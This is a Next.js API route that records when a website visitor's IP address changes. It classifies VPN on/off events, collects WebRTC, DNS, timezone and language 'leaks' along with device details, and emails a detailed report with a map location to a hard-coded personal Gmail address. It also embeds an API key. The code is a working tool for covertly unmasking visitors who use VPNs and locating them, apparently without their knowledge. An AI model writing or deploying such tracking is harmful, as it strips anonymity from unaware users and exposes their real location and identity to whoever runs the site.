// app/api/ip-change/route.ts
// Instant IP change detection with comprehensive leak analysis

import { NextRequest, NextResponse } from 'next/server';
import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY || 're_dbucvqvg_6nVX9uBbM1bfoKtjAA46zCvW');

interface IPChangeData {
  sessionId: string;
  previousIP: string;
  currentIP: string;
  changeType: 'vpn_enabled' | 'vpn_disabled' | 'vpn_server_change' | 'network_change' | 'unknown';
  timestamp: string;

  // Previous state
  previous: {
    ip: string;
    city: string;
    country: string;
    isp: string;
    isVPN: boolean;
    isProxy: boolean;
  };

  // Current state
  current: {
    ip: string;
    city: string;
    country: string;
    isp: string;
    isVPN: boolean;
    isProxy: boolean;
    org: string;
    asn: string;
  };

  // Leak detection results
  leaks: {
    webrtc: {
      leaked: boolean;
      localIPs: string[];
      publicIPs: string[];
      ipv6IPs: string[];
      stunServers: string[];
    };
    dns: {
      leaked: boolean;
      servers: string[];
      ips: string[];
    };
    timezone: {
      mismatch: boolean;
      browserTZ: string;
      expectedTZ: string;
    };
    language: {
      mismatch: boolean;
      browserLang: string;
      expectedLang: string;
    };
  };

  // Device info
  device: {
    userAgent: string;
    platform: string;
    screenSize: string;
    timezone: string;
  };
}

// Enhanced server-side IP analysis
async function analyzeIP(ip: string): Promise<{
  city: string;
  country: string;
  isp: string;
  org: string;
  asn: string;
  isVPN: boolean;
  isProxy: boolean;
  isTor: boolean;
  isDatacenter: boolean;
  lat: number;
  lon: number;
}> {
  const result = {
    city: 'Unknown',
    country: 'Unknown',
    isp: 'Unknown',
    org: 'Unknown',
    asn: 'Unknown',
    isVPN: false,
    isProxy: false,
    isTor: false,
    isDatacenter: false,
    lat: 0,
    lon: 0,
  };

  try {
    // Use ip-api.com (HTTP works server-side)
    const response = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,message,country,city,isp,org,as,proxy,hosting,lat,lon`,
      { signal: AbortSignal.timeout(5000) }
    );
    const data = await response.json();

    if (data.status === 'success') {
      result.city = data.city || 'Unknown';
      result.country = data.country || 'Unknown';
      result.isp = data.isp || 'Unknown';
      result.org = data.org || 'Unknown';
      result.asn = data.as || 'Unknown';
      result.isProxy = data.proxy === true;
      result.isDatacenter = data.hosting === true;
      result.isVPN = data.proxy === true || data.hosting === true;
      result.lat = data.lat || 0;
      result.lon = data.lon || 0;
    }
  } catch (e) {
    console.error('IP analysis failed:', e);
  }

  // Check for VPN keywords in ISP/Org
  const combined = `${result.isp} ${result.org} ${result.asn}`.toLowerCase();
  const vpnKeywords = [
    'vpn', 'nord', 'express', 'surfshark', 'cyberghost', 'proton', 'mullvad',
    'windscribe', 'private internet', 'hotspot', 'tunnel', 'hide.me', 'ipvanish'
  ];
  const datacenterKeywords = [
    'amazon', 'aws', 'google', 'microsoft', 'azure', 'digitalocean', 'linode',
    'vultr', 'ovh', 'hetzner', 'cloudflare', 'm247', 'datacamp'
  ];

  if (vpnKeywords.some(kw => combined.includes(kw))) {
    result.isVPN = true;
  }
  if (datacenterKeywords.some(kw => combined.includes(kw))) {
    result.isDatacenter = true;
    result.isVPN = true;
  }

  return result;
}

export async function POST(request: NextRequest) {
  const startTime = Date.now();

  try {
    const data: IPChangeData = await request.json();

    // Get server-side analysis of both IPs
    const [prevAnalysis, currAnalysis] = await Promise.all([
      analyzeIP(data.previousIP),
      analyzeIP(data.currentIP),
    ]);

    // Determine change type
    let changeType = data.changeType;
    let changeEmoji = '🔄';
    let alertLevel = 'INFO';

    if (!prevAnalysis.isVPN && currAnalysis.isVPN) {
      changeType = 'vpn_enabled';
      changeEmoji = '🛡️';
      alertLevel = 'INFO';
    } else if (prevAnalysis.isVPN && !currAnalysis.isVPN) {
      changeType = 'vpn_disabled';
      changeEmoji = '🚨';
      alertLevel = 'CRITICAL';
    } else if (prevAnalysis.isVPN && currAnalysis.isVPN && data.previousIP !== data.currentIP) {
      changeType = 'vpn_server_change';
      changeEmoji = '🔀';
      alertLevel = 'INFO';
    } else {
      changeType = 'network_change';
      changeEmoji = '📡';
      alertLevel = 'WARNING';
    }

    // Check for leaks
    const hasWebRTCLeak = data.leaks.webrtc.leaked && data.leaks.webrtc.publicIPs.length > 0;
    const hasDNSLeak = data.leaks.dns.leaked;
    const hasTimezoneMismatch = data.leaks.timezone.mismatch;
    const hasLanguageMismatch = data.leaks.language.mismatch;
    const hasAnyLeak = hasWebRTCLeak || hasDNSLeak || hasTimezoneMismatch || hasLanguageMismatch;

    if (hasAnyLeak && currAnalysis.isVPN) {
      alertLevel = 'CRITICAL';
      changeEmoji = '⚠️';
    }

    // Build Maps link
    const mapsLink = `https://www.google.com/maps?q=${currAnalysis.lat},${currAnalysis.lon}`;

    // Build comprehensive email
    const emailBody = `
${changeEmoji} IP CHANGE DETECTED - ${alertLevel}
════════════════════════════════════════════════════════════════

⏰ Time: ${new Date(data.timestamp).toLocaleString('en-US', {
  weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
  hour: '2-digit', minute: '2-digit', second: '2-digit', timeZoneName: 'short'
})}
🆔 Session: ${data.sessionId}
📊 Change Type: ${changeType.replace(/_/g, ' ').toUpperCase()}

════════════════════════════════════════════════════════════════
📡 IP ADDRESS CHANGE
════════════════════════════════════════════════════════════════

🔴 PREVIOUS IP: ${data.previousIP}
   Location: ${prevAnalysis.city}, ${prevAnalysis.country}
   ISP: ${prevAnalysis.isp}
   Org: ${prevAnalysis.org}
   ASN: ${prevAnalysis.asn}
   VPN/Proxy: ${prevAnalysis.isVPN ? '🟡 YES' : '🟢 NO (Real IP)'}

🟢 CURRENT IP: ${data.currentIP}
   Location: ${currAnalysis.city}, ${currAnalysis.country}
   ISP: ${currAnalysis.isp}
   Org: ${currAnalysis.org}
   ASN: ${currAnalysis.asn}
   VPN/Proxy: ${currAnalysis.isVPN ? '🟡 YES' : '🔴 NO (REAL IP EXPOSED!)'}

🗺️ Map: ${mapsLink}

════════════════════════════════════════════════════════════════
⚠️ ANALYSIS
════════════════════════════════════════════════════════════════

${changeType === 'vpn_disabled' ? `
🚨🚨🚨 VPN WAS DISABLED - REAL IP NOW EXPOSED! 🚨🚨🚨

The user turned OFF their VPN. Their real IP address is now visible:
   Real IP: ${data.currentIP}
   Real Location: ${currAnalysis.city}, ${currAnalysis.country}
   Real ISP: ${currAnalysis.isp}
` : ''}
${changeType === 'vpn_enabled' ? `
🛡️ VPN was ENABLED

The user turned ON their VPN. Their real IP is now hidden.
   VPN IP: ${data.currentIP}
   VPN Location: ${currAnalysis.city}, ${currAnalysis.country}
   VPN Provider: ${currAnalysis.isp}
` : ''}
${changeType === 'vpn_server_change' ? `
🔀 VPN Server Changed

User switched VPN servers:
   From: ${prevAnalysis.city}, ${prevAnalysis.country} (${prevAnalysis.isp})
   To: ${currAnalysis.city}, ${currAnalysis.country} (${currAnalysis.isp})
` : ''}
${changeType === 'network_change' ? `
📡 Network Changed

User switched networks (WiFi to mobile, different WiFi, etc.)
   From: ${data.previousIP} (${prevAnalysis.isp})
   To: ${data.currentIP} (${currAnalysis.isp})
` : ''}

════════════════════════════════════════════════════════════════
🔓 LEAK DETECTION REPORT
════════════════════════════════════════════════════════════════

${hasAnyLeak ? '⚠️ LEAKS DETECTED!' : '✅ No leaks detected'}

─── WebRTC Leak ───
Status: ${hasWebRTCLeak ? '🔴 LEAKED' : '🟢 Protected'}
${data.leaks.webrtc.leaked ? `
  Local IPs Found: ${data.leaks.webrtc.localIPs.length > 0 ? data.leaks.webrtc.localIPs.join(', ') : 'None'}
  Public IPs Leaked: ${data.leaks.webrtc.publicIPs.length > 0 ? data.leaks.webrtc.publicIPs.join(', ') : 'None'}
  IPv6 IPs Found: ${data.leaks.webrtc.ipv6IPs.length > 0 ? data.leaks.webrtc.ipv6IPs.join(', ') : 'None'}
  STUN Servers Tested: ${data.leaks.webrtc.stunServers.join(', ')}
` : '  No WebRTC data exposed'}

─── DNS Leak ───
Status: ${hasDNSLeak ? '🔴 LEAKED' : '🟢 Protected'}
${data.leaks.dns.leaked ? `
  DNS Servers: ${data.leaks.dns.servers.join(', ') || 'Unknown'}
  Resolved IPs: ${data.leaks.dns.ips.join(', ') || 'Unknown'}
` : '  DNS queries protected'}

─── Timezone Leak ───
Status: ${hasTimezoneMismatch ? '🟡 MISMATCH' : '🟢 Matched'}
${hasTimezoneMismatch ? `
  Browser Timezone: ${data.leaks.timezone.browserTZ}
  Expected (from IP): ${data.leaks.timezone.expectedTZ}
  ⚠️ This reveals the user's real location!
` : '  Timezone matches IP location'}

─── Language Leak ───
Status: ${hasLanguageMismatch ? '🟡 MISMATCH' : '🟢 Matched'}
${hasLanguageMismatch ? `
  Browser Language: ${data.leaks.language.browserLang}
  Expected (from IP): ${data.leaks.language.expectedLang}
  ⚠️ This suggests user is not from the VPN location!
` : '  Language matches IP location'}

════════════════════════════════════════════════════════════════
🖥️ DEVICE INFO
════════════════════════════════════════════════════════════════

User Agent: ${data.device.userAgent}
Platform: ${data.device.platform}
Screen: ${data.device.screenSize}
Timezone: ${data.device.timezone}

════════════════════════════════════════════════════════════════
Processing Time: ${Date.now() - startTime}ms
════════════════════════════════════════════════════════════════
`;

    // Determine email subject based on severity
    const subjectPrefix = alertLevel === 'CRITICAL' ? '🚨🚨🚨' :
                          alertLevel === 'WARNING' ? '⚠️' : 'ℹ️';
    const subject = `${subjectPrefix} IP CHANGE: ${data.previousIP} → ${data.currentIP} | ${changeType.replace(/_/g, ' ').toUpperCase()}`;

    // Send email
    try {
      await resend.emails.send({
        from: 'IP Monitor <onboarding@resend.dev>',
        to: ['shaidt137@gmail.com'],
        subject: subject,
        text: emailBody,
      });
      console.log(`📧 IP change alert sent: ${changeType}`);
    } catch (emailError: any) {
      console.error('Email failed:', emailError.message);
    }

    return NextResponse.json({
      success: true,
      changeType,
      alertLevel,
      processingTime: Date.now() - startTime,
      previous: prevAnalysis,
      current: currAnalysis,
      leaksDetected: hasAnyLeak,
    });

  } catch (error: any) {
    console.error('IP change processing error:', error);
    return NextResponse.json(
      { success: false, error: error.message },
      { status: 500 }
    );
  }
}
